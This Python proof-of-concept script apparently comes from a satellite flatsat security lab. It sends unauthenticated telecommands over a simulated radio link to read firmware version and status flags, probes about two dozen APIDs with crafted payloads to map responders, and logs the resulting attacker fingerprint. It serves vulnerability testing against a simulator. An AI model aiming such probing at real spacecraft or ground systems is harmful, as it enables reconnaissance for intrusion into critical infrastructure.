#!/usr/bin/env python3
# SPDX-License-Identifier: GPL-2.0-or-later
import os, sys, struct
sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "lib"))
import fslab
from fslab import check
import flatsat_sim as fs


# V-01  SEND_FW unauthenticated inventory leak (CPE-style fingerprint).
# SPARTA: RT-0001 / RT-0001.01
def main(dev, ev):
    tms = dev.tc(0x03, b"", via="radio")            # SEND_FW, raw radio
    fw = dev.find(tms, 0x03)[0]
    v = fw.payload[1:4]
    ver = f"{v[2]}.{v[1]}.{v[0]}"
    ev.log(f"SEND_FW payload={fw.payload.hex()} -> firmware version {ver}")

    st = dev.find(dev.tc(0x0C, b"", via="radio"), 0x0C)[0]
    flags = st.u8(2)
    ev.log(f"GET_STATUS flags=0x{flags:02X}: secure_link={bool(flags & 0x10)} "
           f"payload_armed={bool(flags & 0x20)} usb_debug={bool(flags & 0x40)}")

    responders = []
    probes = {0x01: b"", 0x03: b"", 0x04: b"\x00\x00", 0x05: b"\x02",
              0x06: b"\x03\x92probe", 0x07: b"",
              0x0B: b"\xa5\x00\x00\x20\xc3\x5a",
              0x0C: b"", 0x0D: b"\x01", 0x0E: b"", 0x0F: b"", 0x11: b"\x00",
              0x13: b"", 0x17: b"\x00" + bytes(20),
              0x19: b"\x00\x00\x00\x20\x08\x00",
              0x1D: b"\x00", 0x1E: b"\x02", 0x1F: b"\x03", 0x20: b"",
              0x21: b"\x00", 0x23: b"\x01", 0x25: b"\x01"}
    for apid, pay in probes.items():
        t = dev.tc(apid, pay, via="radio")
        if t:
            responders.append(hex(apid))
    ev.log(f"unauthenticated responders ({len(responders)}): {responders}")
    ev.log("attacker holds exact CPE (software + version + live APID map) "
           "and can match it to the published vulnerability catalogue")
    check(v == bytes([0, 0, 1]), "version must read 1.0.0")
    check(len(responders) >= 18, "broad unauthenticated inventory surface")

if __name__ == "__main__":
    sys.exit(fslab.run_poc(__file__, "V-01 SEND_FW inventory leak", main))
